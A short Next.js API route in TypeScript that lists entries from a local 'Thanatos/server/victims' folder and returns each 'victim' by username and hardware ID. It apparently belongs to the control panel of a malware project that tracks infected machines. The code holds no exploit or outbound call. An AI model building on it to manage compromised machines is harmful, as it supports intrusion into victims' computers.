// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'
import fs, { readFileSync } from 'fs';

type Victim = {
  username: string,
  hwid: string
}

type Data = {
  victims: Victim[]
}

export default function handler(
  _: NextApiRequest,
  res: NextApiResponse<Data>
) {
  fs.readdir('/home/nestyles/Documents/Thanatos/server/victims/', (_, files) => {
    const victims: Victim[] = files.map(file => {
      const username = readFileSync('/home/nestyles/Documents/Thanatos/server/victims/' + file + '/username');
      return {
        username: username.toString(),
        hwid: file
      }
    })
    res.status(200).json({ victims: victims })
  });
}
